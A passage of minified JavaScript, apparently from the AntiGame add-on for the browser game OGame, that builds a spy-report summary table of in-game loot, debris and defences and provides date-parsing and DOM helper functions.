d.ATTACK=f.attr("href");d.ATTACKTITLE=f.html();d.MOON=!1;-1!==d.ATTACK.indexOf("&type=3&")&&(d.MOON=!0);d.LOOT={m:Math.round(d.R1*d.FACTOR),k:Math.round(d.R2*d.FACTOR),d:Math.round(d.R3*d.FACTOR),s:0};d.LOOT.s=d.LOOT.m+d.LOOT.k+d.LOOT.d;p.data.LOOT.m+=d.LOOT.m;p.data.LOOT.k+=d.LOOT.k;p.data.LOOT.d+=d.LOOT.d;p.data.LOOT.s+=d.LOOT.s;var s=d.FACTOR*Math.max(d.R1+d.R2+d.R3,Math.min(0.75*(2*d.R1+d.R2+d.R3),2*d.R1+d.R3));d.SHIPS=[];d.EXTRASHIPS=[];for(b=0;b<p.BEVORZUGT.length;b++){var u=Math.ceil(s/p.TECH[p.BEVORZUGT[b]][5]),
w=Math.ceil(1.1*s/p.TECH[p.BEVORZUGT[b]][5]);d.SHIPS.push(u);d.EXTRASHIPS.push(w-u)}d.FLEET={m:0,k:0,d:0,s:0,p:0};d.DEFENCE={m:0,k:0,d:0,s:0,p:0};d.DEF=0;d.FLEETLIST=[];d.DEFENCELIST=[];a.find("table.fleetdefbuildings td.key").each(function(){var a=g.trim(g(this).text()),b=n.parseInt(g(this).next().text().replace(/\./g,"")),c;for(c in p.TECH)p.TECH[c][0]==a&&(d[c]=[],d[c].push(b),1<p.TECH[c].length&&(d[c].push(b*p.TECH[c][1]),d[c].push(b*p.TECH[c][2]),d[c].push(b*p.TECH[c][3]),"f"===p.TECH[c][4]?
(d.FLEET.m+=b*p.TECH[c][1],d.FLEET.k+=b*p.TECH[c][2],d.FLEET.d+=b*p.TECH[c][3],d.FLEETLIST.push([p.TECH[c][0],b])):"d"===p.TECH[c][4]&&(d.DEFENCE.m+=b*p.TECH[c][1],d.DEFENCE.k+=b*p.TECH[c][2],d.DEFENCE.d+=b*p.TECH[c][3],d.DEF+=b*p.TECH[c][5],d.DEFENCELIST.push([p.TECH[c][0],b]))))});d.FLEET.s=d.FLEET.m+d.FLEET.k+d.FLEET.d;d.FLEET.p=Math.floor(d.FLEET.s/1E3);d.DEFENCE.s=d.DEFENCE.m+d.DEFENCE.k+d.DEFENCE.d;d.DEFENCE.p=Math.floor(d.DEFENCE.s/1E3);d.DEBRISFIELD={m:Math.round(d.FLEET.m*p.DFPERCENT),k:Math.round(d.FLEET.k*
p.DFPERCENT),s:0};d.DEBRISFIELD.s=d.DEBRISFIELD.m+d.DEBRISFIELD.k;p.data.DF.m+=d.DEBRISFIELD.m;p.data.DF.k+=d.DEBRISFIELD.k;p.data.DF.s+=d.DEBRISFIELD.s;d.RECS=Math.ceil(d.DEBRISFIELD.s/2E4);var x=d.SHIPS[0];e.is("FP8")&&(x+=d.EXTRASHIPS[0]);d.ATTACK+="&routine=16&am"+n.parseIntAbs(p.BEVORZUGT[0])+"="+x;return d}catch(y){return null}},ausgabe:function(a){var b,c=g("<div/>").attr("id","spioHelper").hide();g("#messageContent").prepend(c);var d=g("<table/>").attr("cellspacing","0").attr("cellpadding",
"0").appendTo(c),f=g("<tr/>").addClass("header").appendTo(d);g("<th/>").width(18).attr("rel","check").attr("title",p.data.T15).addClass("checkAll").addClass("tooltip").appendTo(f);g("<th/>").attr("rel","coords").text(p.data.T3).attr("title",p.data.T1).addClass("tooltip").appendTo(f);g("<th/>").attr("rel","age").text(p.data.T4).attr("title",p.data.T1).addClass("tooltip").appendTo(f);g("<th/>").attr("rel","player").html(p.data.T5).attr("title",p.data.T1).addClass("tooltip").appendTo(f);g("<th/>").attr("rel",
"loot").text(p.data.T6).attr("title",p.data.T1).addClass("tooltip").appendTo(f);g("<th/>").attr("rel","df").text(p.data.T7).attr("title",p.data.T1).addClass("tooltip").appendTo(f);g("<th/>").attr("rel","def").text(p.data.T8).attr("title",p.data.T1).addClass("tooltip").appendTo(f);g("<th/>").width(84).attr("rel","actions").text(p.data.T14).appendTo(f);for(var h=0;h<a.length;h++){var k=a[h],l=g("<tr/>").addClass("row").appendTo(d);0===h%2&&l.addClass("even");b=g("<td/>").addClass(k.ID).addClass("checkSingle").appendTo(l);
g("<div/>").css({width:"16px",height:"16px"}).attr("title",p.data.T18).addClass("tooltip").appendTo(b);b=g("<td/>").addClass("textCenter").appendTo(l);b=g("<a/>").css("display","block").attr("href","#TR"+k.ID).attr("title",p.data.T9).text(k.COORDS).addClass("tooltip").appendTo(b);k.MOON&&g("<img/>").attr("src","http://"+p.data.UNI+"/cdn/img/galaxy/moon_a.gif").addClass("moon").appendTo(b);b=g("<td/>").appendTo(l);g("<span/>").text(k.AGE).attr("title",k.DATE).addClass("tooltip").appendTo(b);var m=
g("<td/>").appendTo(l);b=p.data.T13;k.A124&&(b=p.data.T10.replace(/\$1/,1+Math.ceil(n.parseInt(k.A124[0])/2)));var q="javascript:AGO_Data('"+k.SPIELERNAME+"',1,2);";g("<a/>").html(k.SPIELER+k.ACTIVITY).attr("title",b).attr("href",q).addClass("tooltip").appendTo(m);m=g("<td/>").addClass("textRight").appendTo(l);q=e.is("M53")?r.shortNumber(k.LOOT.s,1):r.formatNumber(k.LOOT.s);b='<table cellspacing="0" cellpadding="10" style="border:0;">';for(var s=0;s<p.BEVORZUGT.length;s++){var u=r.formatNumber(k.SHIPS[s]);
e.is("FP8")&&(u+=" (+ "+k.EXTRASHIPS[s]+")");b+='<tr><td style="padding-right:10px;">'+p.TECH[p.BEVORZUGT[s]][0]+': </td><td class="textRight">'+u+"</td></tr>"}b+='<tr><td colspan="2" style="height:5px;"></td></tr>';b+='<tr><td style="padding-right:10px;">'+p.data.T6+': </td><td class="textRight" style="color:#99CC00;">'+100*k.FACTOR+"%</td></tr>";b+='<tr><td style="padding-right:10px;">'+e.label("L091")+': </td><td class="textRight">'+r.formatNumber(k.LOOT.m)+"</td></tr>";b+='<tr><td style="padding-right:10px;">'+
e.label("L092")+': </td><td class="textRight">'+r.formatNumber(k.LOOT.k)+"</td></tr>";b+='<tr><td style="padding-right:10px;">'+e.label("L093")+': </td><td class="textRight">'+r.formatNumber(k.LOOT.d)+"</td></tr>";b+="</table>";0===k.LOOT.s&&(b="");g("<span/>").html(q).attr("title",b).addClass("tooltip").appendTo(m);m=g("<td/>").addClass("textRight").appendTo(l);q=e.is("M53")?r.shortNumber(k.DEBRISFIELD.s,1):r.formatNumber(k.DEBRISFIELD.s);b='<table cellspacing="0" cellpadding="10" style="border:0;">';
b+='<tr><td style="padding-right:10px;">'+p.TECH.A209[0]+': </td><td class="textRight">'+r.formatNumber(k.RECS)+"</td></tr>";b+='<tr><td colspan="2" style="height:5px;"></td></tr>';b+='<tr><td style="padding-right:10px;">'+e.label("L091")+': </td><td class="textRight">'+r.formatNumber(k.DEBRISFIELD.m)+"</td></tr>";b+='<tr><td style="padding-right:10px;">'+e.label("L092")+': </td><td class="textRight">'+r.formatNumber(k.DEBRISFIELD.k)+"</td></tr>";b+='<tr><td colspan="2" style="height:15px;"></td></tr>';
b+='<tr><td colspan="2" style="color:#6F9FC8;font-weight:bold;font-size:11px;">'+p.data.T16+"</td></tr>";b+='<tr><td colspan="2"><div class="splitLine" style="min-height:1px;" /></td></tr>';b+='<tr><td style="padding-right:10px;">'+e.label("L091")+': </td><td class="textRight">'+r.formatNumber(k.FLEET.m)+"</td></tr>";b+='<tr><td style="padding-right:10px;">'+e.label("L092")+': </td><td class="textRight">'+r.formatNumber(k.FLEET.k)+"</td></tr>";b+='<tr><td style="padding-right:10px;">'+e.label("L093")+
': </td><td class="textRight">'+r.formatNumber(k.FLEET.d)+"</td></tr>";b+='<tr><td style="padding-right:10px;">'+p.data.T17+': </td><td class="textRight" style="color:#99CC00;">'+r.formatNumber(k.FLEET.p)+"</td></tr>";if(0<k.FLEETLIST.length){b+='<tr><td colspan="2" style="height:15px;"></td></tr>';b+='<tr><td colspan="2" style="color:#6F9FC8;font-weight:bold;font-size:11px;">'+p.data.T22+"</td></tr>";b+='<tr><td colspan="2"><div class="splitLine" style="min-height:1px;" /></td></tr>';for(s=0;s<k.FLEETLIST.length;s++)u=
k.FLEETLIST[s],b+='<tr><td style="padding-right:10px;">'+u[0]+': </td><td class="textRight">'+r.formatNumber(u[1])+"</td></tr>"}b+="</table>";0===k.DEBRISFIELD.s&&(b="");1>k.FDB&&(q=p.data.T13);g("<span/>").html(q).attr("title",b).addClass("tooltip").appendTo(m);m=g("<td/>").addClass("textRight").appendTo(l);q=e.is("M53")?r.shortNumber(k.DEF,1):r.formatNumber(k.DEF);b='<table cellspacing="0" cellpadding="10" style="border:0;">';b+='<tr><td colspan="2" style="color:#6F9FC8;font-weight:bold;font-size:11px;">'+
p.data.T16+"</td></tr>";b+='<tr><td colspan="2"><div class="splitLine" style="min-height:1px;" /></td></tr>';b+='<tr><td style="padding-right:10px;">'+e.label("L091")+': </td><td class="textRight">'+r.formatNumber(k.DEFENCE.m)+"</td></tr>";b+='<tr><td style="padding-right:10px;">'+e.label("L092")+': </td><td class="textRight">'+r.formatNumber(k.DEFENCE.k)+"</td></tr>";b+='<tr><td style="padding-right:10px;">'+e.label("L093")+': </td><td class="textRight">'+r.formatNumber(k.DEFENCE.d)+"</td></tr>";
b+='<tr><td style="padding-right:10px;">'+p.data.T17+': </td><td class="textRight" style="color:#99CC00;">'+r.formatNumber(k.DEFENCE.p)+"</td></tr>";if(0<k.DEFENCELIST.length){b+='<tr><td colspan="2" style="height:15px;"></td></tr>';b+='<tr><td colspan="2" style="color:#6F9FC8;font-weight:bold;font-size:11px;">'+p.data.T23+"</td></tr>";b+='<tr><td colspan="2"><div class="splitLine" style="min-height:1px;" /></td></tr>';for(s=0;s<k.DEFENCELIST.length;s++)u=k.DEFENCELIST[s],b+='<tr><td style="padding-right:10px;">'+
u[0]+': </td><td class="textRight">'+r.formatNumber(u[1])+"</td></tr>"}b+="</table>";0===k.DEFENCE.s&&(b="");2>k.FDB&&(q=p.data.T13);g("<span/>").html(q).attr("title",b).addClass("tooltip").appendTo(m);b=f.find('[rel="def"]').index();l=g("<td/>").addClass("textCenter").insertAfter(l.find("td:eq("+b+")"));l=g("<div/>").css("display","inline-block").appendTo(l);k.ACTIONS.appendTo(l);b=p.data.T11.replace(/\$1/,k.COORDS);g("<a/>").attr("href",k.GALAXY).attr("title",b).text("G").addClass("SHicon").addClass("tooltip").appendTo(l);
k=g("<a/>").attr("href",k.ATTACK).attr("title",k.ATTACKTITLE).text("A").addClass("attackIconButton").addClass("SHicon").addClass("tooltip").appendTo(l);e.is("M16")&&k.attr("target","_blank")}a=p.data.T12+": "+a.length+" | "+p.data.T6+': <span id="SHsummaryLOOT">'+r.formatNumber(p.data.LOOT.s)+"</span> | "+p.data.T7+': <span id="SHsummaryDF">'+r.formatNumber(p.data.DF.s)+"</span>";g("<div/>").width(600).html(a).addClass("summary").appendTo(c);0<p.data.LOOT.s&&(b='<table cellspacing="0" cellpadding="10" style="border:0;">'+
('<tr><td style="padding-right:10px;">'+e.label("L091")+': </td><td class="textRight">'+r.formatNumber(p.data.LOOT.m)+"</td></tr>"),b+='<tr><td style="padding-right:10px;">'+e.label("L092")+': </td><td class="textRight">'+r.formatNumber(p.data.LOOT.k)+"</td></tr>",b+='<tr><td style="padding-right:10px;">'+e.label("L093")+': </td><td class="textRight">'+r.formatNumber(p.data.LOOT.d)+"</td></tr>",g("#SHsummaryLOOT").attr("title",b+"</table>").addClass("tooltip").css("cursor","help"));0<p.data.DF.s&&
(b='<table cellspacing="0" cellpadding="10" style="border:0;">'+('<tr><td style="padding-right:10px;">'+e.label("L091")+': </td><td class="textRight">'+r.formatNumber(p.data.DF.m)+"</td></tr>"),b+='<tr><td style="padding-right:10px;">'+e.label("L092")+': </td><td class="textRight">'+r.formatNumber(p.data.DF.k)+"</td></tr>",b+="</table>",g("#SHsummaryDF").attr("title",b).addClass("tooltip").css("cursor","help"));return c},addCheck:function(a){-1===p.data.CHECKED.indexOf(a)&&(p.data.CHECKED.push(a),
setTimeout(function(){p.setValue(p.data.UNI+p.data.NAME,p.data)},0));setTimeout(function(){p.setValue(p.data.UNI+p.data.NAME,p.data)},0)},removeCheck:function(a){0<p.data.CHECKED.length&&(a=p.data.CHECKED.indexOf(a),-1!==a&&(p.data.CHECKED.splice(a,1),setTimeout(function(){p.setValue(p.data.UNI+p.data.NAME,p.data)},0)))},addAllCheck:function(a){a.find("td.checkSingle").each(function(){var a=/([0-9]+)/.exec(g(this).attr("class"))[1];p.addCheck(a)})},removeAllCheck:function(a){a.find("td.checkSingle").each(function(){var a=
/([0-9]+)/.exec(g(this).attr("class"))[1];p.removeCheck(a)})},prepareForSorting:function(a,b){var c,d;return"coords"===a?(c=0,d=/([0-9]+):([0-9]+):([0-9]+)/.exec(b),null!==d&&(c=n.parseInt(("00"+d[1]).slice(-2)+("000"+d[2]).slice(-3)+("00"+d[3]).slice(-2))),c):"age"===a?(c=0,d=/(\d+)h/.exec(b),null!==d&&(c+=3600*n.parseInt(d[1])),d=/(\d+)m/.exec(b),null!==d&&(c+=60*n.parseInt(d[1])),d=/(\d+)s/.exec(b),null!==d&&(c+=n.parseInt(d[1])),c):"player"===a?(c=b.replace(/\s\([0-9]+\)/g,""),c=g.trim(c.toLowerCase())):
"loot"===a||"df"===a||"def"===a?(b=b.replace(/\./g,""),-1!==b.indexOf(" M")?(c=n.parseInt(b.replace(/\sM/g,"")),c*=1E6):-1!==b.indexOf(" k")?(c=n.parseInt(b.replace(/\sk/g,"")),c*=1E3):c=n.parseInt(b),c):b}},A={isLocal:!1,Init:function(){A.serverTime=s.serverTime?s.serverTime.getTime():0;A.timeZoneDelta=-(n.d(s.localTime.getTime())-n.d(s.startServerTime));A.timeDelta=(new Date).getTime()-A.timeZoneDelta-A.serverTime;if(e.is("A31")){s.AntiGame_timeoffset=A.timeZoneDelta;var a=s.getFormatedDate;s.getFormatedDate=
function(b,c){return a(b+A.timeZoneDelta,c)};A.isLocal=A.timeZoneDelta?!0:!1}},timestamp:function(){return Math.floor((new Date).getTime()/1E3)},getDatePart:function(a){return Date.UTC(a.getFullYear(),a.getMonth(),a.getDate())},getFinishTime:function(a){var b=new Date;b.setTime(A.serverTime+1E3*n.d(a));return b},format:function(a,b,c){var d="";a&&("object"!==typeof a&&500<a&&(a=new Date(a)),e.is("A31")&&!c&&a.setTime(a.getTime()+A.timeZoneDelta),b||(b=(this.getDatePart(new Date)!==this.getDatePart(a)?
"[d]/[m] ":"")+"[H]:[i]:[s]"),d=b,b=a.getHours(),d=d.split("[d]").join(this.LZ(a.getDate())).split("[m]").join(this.LZ(a.getMonth()+1)).split("[Y]").join(a.getFullYear()).split("[y]").join(a.getFullYear().toString().substr(2,4)).split("[H]").join(this.LZ(b)).split("[i]").join(this.LZ(a.getMinutes())).split("[s]").join(this.LZ(a.getSeconds())));return d},formatTimestamp:function(a,b){return 1E6<a?A.format(1E3*a,b||"[d].[m].[Y] [H]:[i]",!0):""},formatTime:function(a,b){var c,d,f,g,h,k;k=a;b&&(c=Math.floor(k/
86400/365),k-=31536E3*c,d=Math.floor(k/86400/7),k-=604800*d,f=Math.floor(k/86400),k-=86400*f);g=Math.floor(k/3600);k-=3600*g;h=Math.floor(k/60);k-=60*h;return b?r.wrap(" ",c,e.year)+r.wrap(" ",d,e.week)+r.wrap(" ",f,e.day)+r.wrap(" ",g,e.hour)+r.wrap(" ",h,e.minute)+r.wrap(" ",k,e.second):A.LZ(g)+":"+A.LZ(h)+":"+A.LZ(k)},LZ:function(a){return(0>a||9<a?"":"0")+a},parseFormatedTime:function(a){var b=0,c,d;if(a){a=a.trim().split(" ");for(d=0;d<a.length;d++)c=n.parseIntAbs(a[d]),-1<a[d].indexOf(e.year)?
b+=31536E3*c:-1<a[d].indexOf(e.week)?b+=604800*c:-1<a[d].indexOf(e.day)?b+=86400*c:-1<a[d].indexOf(e.hour)?b+=3600*c:-1<a[d].indexOf(e.minute)?b+=60*c:-1<a[d].indexOf(e.second)&&(b+=c)}return b},parseTime:function(a){if(!a)return 0;a=a.replace(/[^0-9:]/,"");a=a.split(":");return!a||3!==a.length?0:1E3*(3600*parseInt(a[0],10)+60*parseInt(a[1],10)+parseInt(a[2],10))},parse:function(a,b){a=a.toString();var c=b.match(/\[[dmyYHis]\]/g);if(!c||!c.length)return null;var d;d=b.replace(/\./g,"\\.");d=d.replace(/\//g,
"\\/");d=d.replace(/\-/g,"\\-");for(var e={},f=0;f<c.length;f++){var g=c[f];d="[Y]"===g?d.replace(g,"(\\d{4,4})"):"[y]"===g?d.replace(g,"(\\d{2,2})"):d.replace(g,"(\\d{1,2})");g=g.substr(1,1);e[g]=f+1}c=a.match(RegExp(d,""));if(!c||!c.length)return null;d=new Date;d.setSeconds(0);d.setMinutes(0);d.setHours(0);c[e.s]&&d.setSeconds(c[e.s]);c[e.i]&&d.setMinutes(c[e.i]);c[e.H]&&d.setHours(c[e.H]);c[e.Y]?d.setFullYear(c[e.Y]):c[e.y]&&(f=d.getFullYear(),f=100*Math.floor(f/100)+c[e.y],f>d.getFullYear()&&
(f-=100),d.setFullYear(f));c[e.d]&&d.setDate(1);c[e.m]&&d.setMonth(c[e.m]-1);c[e.d]&&d.setDate(c[e.d]);return d},parse2:function(a,b,c){if(!a)return null;b||(b="[H]:[i]:[s]",c="[d].[m].[Y]");a=a.toString();if(c){b=this.parse(a,b);c=this.parse(a,c);if(!c&&!b)return null;a=new Date;c&&(a.setFullYear(c.getFullYear()),a.setMonth(c.getMonth()),a.setDate(c.getDate()));b&&(a.setHours(b.getHours()),a.setMinutes(b.getMinutes()),a.setSeconds(b.getSeconds()));return a}return this.parse(a,b,!0)},changeTime:function(a,
b,c){var d,e;g(a,b||document).each(function(){if(d=g(this).text())(e=A.convertLocal(d,c))&&g(this).attr("original",d).text(e)})},changeTimeTitle:function(a,b,c){var d,e;g(a,b||document).each(function(){if(d=g(this).attr("title"))(e=A.convertLocal(d,c))&&g(this).attr("original_title",d).attr("title",e)})},convertLocal:function(a,b,c){var d=a.toString();if(A.isLocal&&(b||(b="[H]:[i]:[s]",c="[d].[m].[Y]"),a=A.parse2(a,b,c)))d=d.replace(A.format(a,b,!0,!0),A.format(a,b)),c&&(d=d.replace(A.format(a,c,
!0),A.format(a,c)));return d}},h={EventCache:{},click:function(a,b){h.trigger(a,"click",b)},trigger:function(a,b,c){if((a="string"===typeof a?(c||document).querySelector(a):a)&&b)if("click"===b||"mouseup"===b||"mousedown"===b||"mouseover"===b||"mouseout"===b)c=document.createEvent("MouseEvents"),c.initMouseEvent(b,!0,!0,s,0,0,0,0,0,!1,!1,!1,!1,0,null),a.dispatchEvent(c);else if("change"===b||"focus"===b||"blur"===b)c=document.createEvent("HTMLEvents"),c.initEvent(b,!0,!1),a.dispatchEvent(c)},addEvent:function(a,
b,c,d,e,f){if(a&&(b&&c)&&(a="string"===typeof a?(e||document).querySelector(a):a))a.addEventListener(b,c,d||!1),f&&(h.EventCache[f]||(h.EventCache[f]=[]),h.EventCache[f].push({node:a,event:b,callback:c,capture:d||!1}))},addEventAll:function(a,b,c,d,e,f){if(a&&a.length){f&&!h.EventCache[f]&&(h.EventCache[f]=[]);a="string"===typeof a?(e||document).querySelectorAll(a):a;for(e=0;e<a.length;e++)a[e].addEventListener(b,c,d||!1),f&&h.EventCache[f].push({node:a[e],event:b,callback:c,capture:d||!1})}},removeEvent:function(a,
b,c,d,e){a&&b&&c&&(a="string"===typeof a?(e||document).querySelector(a):a)&&a.removeEventListener(b,c,d||!1)},removeEventCacheAll:function(a){var b,c;if(a&&h.EventCache[a]){b=h.EventCache[a];for(c=0;c<b.length;c++)b[c].node&&b[c].node.removeEventListener(b[c].event,b[c].callback,b[c].capture),b[c].node=null,b[c].callback=null;h.EventCache[a]=null}},prepend:function(a,b){a&&b&&(a.childNodes.length?a.insertBefore(b,a.childNodes[0]):a.appendChild(b))},append:function(a,b){a&&b&&a.appendChild(b)},before:function(a,
b){a&&b&&a.parentNode.insertBefore(b,a)},after:function(a,b){a&&b&&(a.nextElementSibling?a.parentNode.insertBefore(b,a.nextElementSibling):a.parentNode.appendChild(b))},removeChildren:function(a,b,c){if(c="string"===typeof a&&a?(c||document).querySelector(a):a)for(a=0;a<c.childNodes.length;a++)(!b||c.childNodes[a].nodeType===b)&&c.removeChild(c.childNodes[a])},create:function(a,b,c,d,e){a=document.createElement(a);if(b)for(var f in b)a.setAttribute(f,b[f]);if(c)for(var g in c)a.style[g]=c[g];e&&(a.innerHTML=
e);d&&(a.textContent=d);return a},createA:function(a,b,c,d){a&&!a.href&&(a.href="javascript:void(0);");return h.create("a",a,b,c,d)},getElementsFromElementByClass:function(a,b){var c="string"===typeof a?document.getElementById(a):a;return c?c.getElementsByClassName(b):null},hasParentsId:function(a,b,c){c=Math.min(c||5,9);for(var d=0;d<c;d++)if(a){if(a.id===b)return!0;a=a.parentNode}else break;return!1},getSelectedNode:function(a){return a&&a.options&&"selectedIndex"in a?a.options[a.selectedIndex]:
null},getChildnodeByName:function(a,b){for(var c=0;c<a.children.length;c++)if(a.children[c].tagName===b)return a.children[c];return null},getHtmlById:function(a){return(a=document.getElementById(a))?a.innerHTML:""},setHtmlById:function(a,b){var c=document.getElementById(a);c&&(c.innerHTML=b||"")},getText:function(a,b){var c="string"===typeof a?(b||document).querySelector(a):a;return c?c.textContent:""},getTextById:function(a){return(a=document.getElementById(a))?a.textContent:""},getTextByClass:function(a,
b){var c=b?b.getElementsByClassName(a)[0]:null;return c?c.textContent:""},setText:function(a,b,c){if(a="string"===typeof a?(c||document).querySelector(a):a)a.textContent=b||""},setTextById:function(a,b){var c=document.getElementById(a);c&&(c.textContent=b||"")},setTextByClass:function(a,b,c){if(a=c?c.getElementsByClassName(a)[0]:null)a.textContent=b||""},getTextFromChildnode:function(a,b){var c,d,e="string"===typeof a?(b||document).querySelector(a):a;if(e&&e.childNodes)for(d=0;d<e.childNodes.length;d++)if(3===
+e.childNodes[d].nodeType&&(c=(e.childNodes[d].nodeValue||"").trim()))return c;return""},getAttribute:function(a,b,c){return(a="string"===typeof a?(c||document).querySelector(a):a)?a.getAttribute(b):""},getAttributeById:function(a,b){var c=document.getElementById(a);return c?c.getAttribute(b):""},getAttributeByClass:function(a,b,c){return(a=c?c.getElementsByClassName(a)[0]:document.getElementById(a))?a.getAttribute(b):""},setAttribute:function(a,b,c,d){(a="string"===typeof a?(d||document).querySelector(a):
a)&&a.setAttribute(b,c||"")},getProperty:function(a,b,c){return(a="string"===typeof a?(c||document).querySelector(a):a)?a[b]:""},setProperty:function(a,b,c,d){(a="string"===typeof a?(d||document).querySelector(a):a)&&(a[b]=c)},getTitle:function(a,b){var c,d="string"===typeof a?(b||document).querySelector(a):a;return d?(c=d.getAttribute("title")||"")&&c.length?c:g(d).data("tipped_restore_title")||"":""},getValue:function(a,b){var c="string"===typeof a?(b||document).querySelector(a):a;return c?c.value:
""},getValueInteger:function(a,b){var c="string"===typeof a?(b||document).querySelector(a):a;return c?n.parseIntFormat(c.value):0},getValueByIdInteger:function(a){return(a=document.getElementById(a))?n.parseIntFormat(a.value):0},setValue:function(a,b,c){if(a="string"===typeof a?(c||document).querySelector(a):a)a.value=b||""},setValueByIdInteger:function(a,b){var c=document.getElementById(a);c&&(c.value=n.parseIntFormat(b)||"")},setValueChange:function(a,b,c){if(a="string"===typeof a?(c||document).querySelector(a):
a)a.value=b||"",h.trigger(a,"change")},setClass:function(a,b,c){if(a="string"===typeof a?(c||document).querySelector(a):a)a.className=b||""},addClass:function(a,b,c){if((c="string"===typeof a?(c||document).querySelector(a):a)&&b)a=(" "+(c.className||"").toLowerCase()+" ").indexOf(" "+b.toLowerCase().trim()+" "),-1===a&&(c.className=(c.className?c.className+" ":"")+b)},addClassAll:function(a,b,c){if((c="string"===typeof a?(c||document).querySelectorAll(a):a)&&c.length&&b)for(a=0;a<c.length;a++)h.addClass(c[a],
b)},removeClass:function(a,b,c){var d;if((a="string"===typeof a?(c||document).querySelector(a):a)&&b)d=(" "+(a.className||"").toLowerCase()+" ").indexOf(" "+b.toLowerCase().trim()+" "),-1<d&&(c=0<d?a.className.slice(0,d).trim():"",b=a.className.slice(d+b.length).trim(),a.className=c+(c&&b?" ":"")+b)},removeClassAll:function(a,b,c){if((c="string"===typeof a?(c||document).querySelectorAll(a):a)&&c.length&&b)for(a=0;a<c.length;a++)h.removeClass(c[a],b)},hasClass:function(a,b,c){return(a="string"===typeof a?
(c||document).querySelector(a):a)?w.hasClass(a.className,b):!1},setStyles:function(a,b,c){var d;if((a="string"===typeof a?(c||document).querySelector(a):a)&&b)for(d in b)a.style[d]=b[d]},setStylesById:function(a,b){var c=document.getElementById(a);if(c&&b)for(var d in b)c.style[d]=b[d]},setStylesByClass:function(a,b,c){if((a=c?c.getElementsByClassName(a)[0]:null)&&b)for(var d in b)a.style[d]=b[d]},setDisplay:function(a,b,c,d){if(a="string"===typeof a?(d||document).querySelector(a):a)a.style.display=
c?b||"inline":"none"},setDisplayAll:function(a,b,c,d){d="string"===typeof a?(d||document).querySelectorAll(a):a;for(a=0;a<d.length;a++)d[a].style.display=c?b||"inline":"none"},isDisplay:function(a,b){var c="string"===typeof a?(b||document).querySelector(a):a;return c&&"none"!==c.style.display},getScript:function(){var a,b,c=document.getElementsByTagName("script");for(a=0;a<c.length;a++)if(!c[a].src&&(b=c[a].innerHTML)&&-1<b.indexOf("var session")){h.ogameScript=b;break}}},K={addFeedback:function(a,
b,c){(c||e.is("A26"))&&h.addClass(a,"ago_feedback",b)},isFirstShow:function(a){a=g(a);return a.length&&!a.attr("AntiGame")?(a.attr("AntiGame","1"),!0):!1},disableAutocomplete:function(){e.is("A25")&&setTimeout(function(){for(var a=document.querySelectorAll("form"),b=0;b<a.length;b++)a[b].setAttribute("autocomplete","off")},0)},toggleLargeHeader:function(a){var b=a?"#planet.shortHeader a.toggleHeader":"#planet:not(.shortHeader) a.toggleHeader";(e.is("A11")||a)&&setTimeout(h.click,0,b)},preloadMissionIcon:function(){for(var a=
1;a<w.missionIcon.length;a++)w.missionIcon[a]&&((new Image).src=w.urlMissionIcon(a))}},w={missionIcon:[0,"angriff","verband","transport","stationieren","halten","spionage","kolonisieren","tf-abbauen","zerstoeren",0,0,0,0,0,"expedition"],TABLE:function(a,b,c,d,e,f){return'<table style="width: '+r.d(c,"auto")+"; padding: "+(d||0)+"; margin: "+(e||0)+'; border-collapse: collapse;"'+(a?' id="'+a+'"':"")+(b?' class="'+b+'"':"")+"><tbody>"+f+"</tbody></table>"},IMG:function(a,b){return'<img width="'+b+
'" height="'+b+'" src="'+(a||"/cdn/img/layout/pixel.gif")+'" />'},urlMissionIcon:function(a){return a&&w.missionIcon[a]?"/cdn/img/layout/icon-"+w.missionIcon[a]+".gif":"/cdn/img/layout/pixel.gif"},urlTypeIcon:function(a,b){return(b?2===a?"/cdn/img/galaxy/tf_b.gif":3===a?"/cdn/img/galaxy/moon_b.gif":"":2===a?"/cdn/img/galaxy/tf_a.gif":3===a?"/cdn/img/galaxy/moon_a.gif":"")||"/cdn/img/layout/pixel.gif"},classType:function(a){return["ago_color_current","ago_color_planet","ago_color_debris","ago_color_moon"][a]||
""},hasClass:function(a,b){return b?-1<(" "+(a||"").toLowerCase()+" ").indexOf(" "+b.toLowerCase().trim()+" "):!1},classStatusColor:function(a){return e.getMore("C"+a,"")},classStatusHighlight:function(a){return e.getMore("C"+a,"")+"_back"},color:function(a,b){return a&&(4===a.length||7===a.length)?0<b&&100>b?(a=7===a.length?parseInt(a.substring(1,3),16)+","+parseInt(a.substring(3,5),16)+","+parseInt(a.substring(5,7),16):parseInt(a.substring(1,2),16)+","+parseInt(a.substring(2,3),16)+","+parseInt(a.substring(3,
4),16),"rgba("+a+(10>b?",0.0":",0.")+b+")"):a:""},css:function(a,b,c){return b?c?a+": "+b+" !important;":a+": "+b+";":""},getTooltip:function(a,b){a=e.label(a);b=b&&e.is("A21")?"&lt;span class=&quot;anti_shortcut&quot;&gt;"+b+"&lt;/span&gt;&nbsp;&nbsp;":"";return a||b?' class="tooltip js_hideTipOnMobile" title="'+b+a+'"':""},getPlayer:function(a){return(a.playerHonor?'<span class="honorRank '+f.getHonorClass(a.playerHonor)+'">&nbsp;</span>':"")+'<span class="'+w.classStatusColor(a.playerStatus)+'">'+
a.playerName+"</span>"}},P={attribute:function(a,b,c){if(a&&b){var d=a.indexOf(">");if(0<=d){var e=a.slice(0,d+1),d=e.indexOf(" "+b+'="');if(0<=d&&(e=e.indexOf('"',d+3+b.length),0<=e))return c===C?n.parseIntFormat(a.slice(d+3+b.length,e)):a.slice(d+3+b.length,e)}}return c===C?0:""},stripAttribute:function(a,b,c){return a&&(a.length&&b)&&(b=a.indexOf(b+'="',c),0<=b)?(a.slice(b).split('"',2)[1]||"").split('"',1)[0].trim():""},innerText:function(a,b,c,d){if(a&&(b=b?a.indexOf(b,c):0,0<=b&&(b=a.indexOf(">",
b))))if(c=a.indexOf("<",b))return d===C?n.parseIntFormat(a.slice(b+1,c)):a.slice(b+1,c).trim();return d===C?0:""},outerHTML:function(a,b,c,d,e,f){var g=f?[]:"";if(a&&b&&c){d&&(c=" "+c+'="');for(var h,k=e||0;0<=k;)if(k=a.indexOf(d||c,k+3),0<=k){h=a.lastIndexOf("<",k);if(d){if(e=0<=h&&a.lastIndexOf("<"+b+" ",h)===h?h:-1,0<=e&&(h=a.lastIndexOf('"',k),h<e||a.slice(h+1-c.length,h+1)!==c))e=-1}else e=0<=h&&(a.lastIndexOf("<"+b+" ",h)===h||a.lastIndexOf("<"+b+">",h)===h)?h:-1;if(0<=e)if(h=P.findCloseTag(a,
